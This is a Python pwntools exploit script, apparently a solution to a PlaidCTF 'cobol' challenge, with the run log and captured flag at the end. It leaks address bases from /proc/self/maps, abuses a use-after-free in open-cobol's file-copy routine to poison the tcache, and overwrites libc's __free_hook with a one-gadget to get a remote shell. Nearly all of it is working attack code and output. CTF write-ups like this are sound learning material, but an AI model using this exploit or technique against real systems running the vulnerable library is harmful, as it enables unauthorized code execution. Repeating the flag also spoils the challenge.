"""
"""
from pwn import *
import time
import ctypes

context.update(arch="amd64", os="linux", bits=64)


gdbscript = '''
continue
'''.format(**locals())

def start(exe, argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def do_index_buf(fname, index, size):
    io.sendlineafter("File Name: \n", fname)
    line = io.recvline()
    if line == b"Index: \n":
        io.sendline(str(index))
    line = io.recvline()
    if line == b"Buf Size: \n":
        io.sendline(str(size))
    return io.recvuntil('> \n')

def do_create(fname, index, size):
    io.sendline("1")
    return do_index_buf(fname, index, size)

def do_open(fname, index, size):
    io.sendline("2")
    return do_index_buf(fname, index, size)

def do_read(index, size):
    io.sendline("3")
    io.sendlineafter("Index: \n", str(index))
    return io.recvuntil('> \n')

def do_write(index, input):
    io.sendline("4")
    io.sendlineafter("Index:", str(index) + '\n')
    io.sendlineafter("Input:", input)
    io.sendlineafter(")", 'no\n')
    return io.recvuntil('> \n')

def do_close(index):
    io.sendline("5")
    io.sendlineafter("Index: \n", str(index))
    line = io.recvline()
    if line == b"Buf Size: \n":
        io.sendline(str(size))
    return io.recvuntil('> \n')

def do_copy(file1, file2):
    io.sendline("6")
    io.sendlineafter("Enter filename1: \n", file1)
    io.sendlineafter("Enter filename2: \n", file2)
    return io.recvuntil('> \n')

def do_exit():
    io.sendline("7")


if __name__ == "__main__":
    binary_path = "./dist/chall"
    host = "cobol.pwni.ng"
    port = 3083

    elf = ELF(binary_path)
    if args.LOCAL:
        io = start(binary_path)
        # so we dont have look at our files
        fname_prefix = 'out/'
    else:
        io = remote(host, port)
        fname_prefix = ''

    io.recvuntil('> \n')


    ## Get bases from /proc/self/maps, copy maps into stdin
    r = do_copy("/proc/self/maps", "/dev/stdout")
    maps = r.split(b'\n')
    elf_base = int(maps[0].split(b'-')[0], 16)
    heap_base = int(maps[4].split(b'-')[0], 16)
    for i in range(len(maps[5:])):
        row = maps[i]
        if b'libc-' in row:
            libc_base = int(maps[i].split(b'-')[0], 16)
            break
    else:
        raise Exception('error getting maps')
    print("elf_base:", hex(elf_base))
    print("heap_base:", hex(heap_base))
    print("libc_base:", hex(libc_base))
    free_hook = libc_base + 0x3ed8e8
    magic_gadget = libc_base + 0x10a41c


    ## Create a file with fname length of our chosen tcache bin size (0x40)
    #   - set file size to something else (0x20)
    fname = fname_prefix
    fname += 'A'*(0x40 - len(fname) - 0x10)
    do_create(fname, 1, 0x10)
    do_open(fname, 2, 0x10)

    # store address we want to write in file
    data = "A"*8 + 'B'*8
    # subtract for header & allignment
    hook = free_hook - 0x10
    data = p64(hook) + p64(hook)
    do_write(1, data)


    ## Copy 1st file into a new file to trigger a UAF and overwrite a tcache entry
    #   - UAF located here: https://github.com/cooljeanius/open-cobol/blob/6391bcc51b26672d482e768cafc69d16a12036d5/libcob/fileio.c#L4701
    # for file #2, choose a smaller fname size so we end up in a different bin (0x20)
    fname1 = fname_prefix + 'B'*0x4
    do_copy(fname, fname1)


    ## Create a new file with its file size to match the tcache bin size (0x40)
    #   - set fname size to be in some other bin (0x80)
    fname2 = fname_prefix
    fname2 += 'F'*(0x80-len(fname2) - 0x10)
    # pop off 1st 0x40 entry
    do_create(fname2, 3, 0x38)
    # pop off 2nd 0x40 entry, `free_hook`
    do_open(fname2, 4, 0x38)

    ## Write magic_gadget to new file, overwritting free_hook
    data = b'\x00'*16
    data += p64(magic_gadget) + p64(magic_gadget)
    do_write(4, data+ b'\n')


    ## Close file to trigger `free()` call, calling the free_hook overwrite
    io.sendline("5")
    io.sendline("4")

    # finish reading stdin
    io.recvuntil('>')
    io.recvuntil('>')
    io.recvuntil('Index: \n')


    print('Run `/freader` for flag')
    io.interactive()
    io.close()
"""
[+] Opening connection to cobol.pwni.ng on port 3083: Done
elf_base: 0x557aa3943000
heap_base: 0x557aa45b7000
libc_base: 0x7fe7f248f000
Run `/freader` for flag
[*] Switching to interactive mode
$ /freader
PCTF{l3arning_n3w_languag3_sh0uld_start_with_g00d_bugs_99d4ec917d097f63107e}
"""
